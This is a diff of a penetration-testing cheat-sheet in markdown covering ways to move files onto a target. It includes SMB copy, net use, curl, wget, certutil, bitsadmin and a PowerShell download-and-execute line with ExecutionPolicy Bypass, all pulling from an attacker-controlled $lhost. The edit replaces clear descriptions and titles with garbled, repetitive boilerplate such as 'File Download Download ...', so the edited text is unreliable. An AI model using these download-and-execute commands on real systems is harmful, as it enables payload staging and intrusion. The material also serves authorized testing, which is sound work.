@@ -4,9 +4,9 @@
 
 ### SMB copy no creds
 
-Pull a file from your attacker SMB share via `copy`. Works against an open/anonymous impacket smbserver, no creds required.
+Download SMB copy no creds with File_download.
 
-```sh title:"copy from anonymous SMB share, no creds required"
+```sh title:"File Download Download SMB Copy No Creds"
 copy '\\\$lhost\\$share\\$file'
 ```
 <!-- cheat
@@ -19,9 +19,9 @@ var file
 
 ### SMB copy with creds
 
-Same `copy` exfil flow but authenticated; use when your smbserver is started with dummy creds (`smbserver.py -username x -password y`).
+Download SMB copy with creds with File_download.
 
-```sh title:"copy from authenticated SMB share with user/pass"
+```sh title:"File Download Download SMB Copy with Creds"
 copy '\\\$lhost\\$share\\$file' /user:$user $pass
 ```
 <!-- cheat
@@ -34,9 +34,9 @@ var file
 
 ### Net use mount no creds
 
-Mount your attacker share to a drive letter, then copy from it. Better for multiple file pulls than per-file `copy`.
+Download net use mount no creds with File_download.
 
-```sh title:"Mount anonymous SMB share to drive letter for pulls"
+```sh title:"File Download Download Net Use Mount No Creds"
 net use n: '\\\$lhost\\$share' # then: copy n:\file.txt
 ```
 <!-- cheat
@@ -48,9 +48,9 @@ var share
 
 ### Net use mount with creds
 
-Authenticated mount of your attacker share to a drive letter; needed when the smbserver requires creds.
+Download net use mount with creds with File_download.
 
-```sh title:"Mount authenticated SMB share to drive letter"
+```sh title:"File Download Download Net Use Mount with Creds"
 net use n: '\\\$lhost\\$share' /user:$user $pass # then: copy n:\file.txt
 ```
 <!-- cheat
@@ -64,9 +64,9 @@ var share
 
 ### Curl download
 
-Pull a file from your HTTP listener. Most reliable on Linux targets and modern Windows with curl.exe (1803+).
+Download curl download with File_download.
 
-```sh title:"curl pull from attacker HTTP listener to disk"
+```sh title:"File Download Download Curl Download"
 curl $scheme://$lhost:$lport/$file -o $file
 ```
 <!-- cheat
@@ -82,9 +82,9 @@ var scheme
 
 ### wget download
 
-Same idea with wget for Linux targets that don't have curl.
+Download wget download with File_download.
 
-```sh title:"wget pull from attacker HTTP listener"
+```sh title:"File Download Download Wget Download"
 wget $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -100,9 +100,9 @@ var scheme
 
 ### CertUtil download (small)
 
-LOLBAS download via certutil URL cache; fine for small files. Old AVs flagged this so it's noisier than curl.
+Download CertUtil download (small) with File_download.
 
-```sh title:"certutil -urlcache pull, fine for small files"
+```sh title:"File Download Download CertUtil Download (small)"
 certutil -urlcache -f $scheme://$lhost:$lport/$file $upload_location_template$file
 ```
 <!-- cheat
@@ -119,9 +119,9 @@ var upload_location_template
 
 ### CertUtil download (large)
 
-certutil with `-split`; required for files large enough that the URL cache mode chokes.
+Download CertUtil download (large) with File_download.
 
-```sh title:"certutil -urlcache -split for larger files"
+```sh title:"File Download Download CertUtil Download (large)"
 certutil -urlcache -split -f $scheme://$lhost:$lport/$file $upload_location_template$file
 ```
 <!-- cheat
@@ -138,9 +138,9 @@ var upload_location_template
 
 ### BitsAdmin download
 
-LOLBAS download via the BITS service. Survives flaky links, runs as the BITS service so process tree looks more legit than certutil.
+Download BitsAdmin download with File_download.
 
-```sh title:"bitsadmin transfer, resilient over flaky links"
+```sh title:"File Download Download BitsAdmin Download"
 bitsadmin /transfer job $scheme://$lhost:$lport/$file $upload_location_template$file
 ```
 <!-- cheat
@@ -157,9 +157,9 @@ var upload_location_template
 
 ### CertUtil verifyctl download
 
-Alternate certutil download mode using `-verifyctl`.
+Download CertUtil verifyctl download with File_download.
 
-```cmd title:"certutil -verifyctl download alternate mode"
+```cmd title:"File Download Download CertUtil Verifyctl Download"
 certutil.exe -verifyctl -f -split "$scheme://$lhost:$lport/$file" "$upload_location_template$file"
 ```
 <!-- cheat
@@ -175,9 +175,9 @@ var upload_location_template
 
 ### CertUtil decode base64
 
-Decode a base64 file with certutil.
+Download CertUtil decode base64 with File_download.
 
-```cmd title:"Decode base64 file with certutil"
+```cmd title:"File Download Download CertUtil Decode Base64"
 certutil.exe -decode "$encoded_file" "$output_file"
 ```
 <!-- cheat
@@ -187,9 +187,9 @@ var output_file
 
 ### PowerShell download
 
-Download a file with PowerShell WebClient.
+Download PowerShell download with File_download.
 
-```powershell title:"Download file with PowerShell WebClient"
+```powershell title:"File Download Download PowerShell Download"
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "(New-Object System.Net.WebClient).DownloadFile('$scheme://$lhost:$lport/$file', '$upload_location_template$file')"
 ```
 <!-- cheat
@@ -205,9 +205,9 @@ var upload_location_template
 
 ### PowerShell download and execute
 
-Download a payload and execute it with PowerShell.
+Download PowerShell download and execute with File_download.
 
-```powershell title:"Download payload and execute with PowerShell"
+```powershell title:"File Download Download PowerShell Download and Execute"
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "(New-Object System.Net.WebClient).DownloadFile('$url', '$output_file'); Start-Process '$output_file'"
 ```
 <!-- cheat
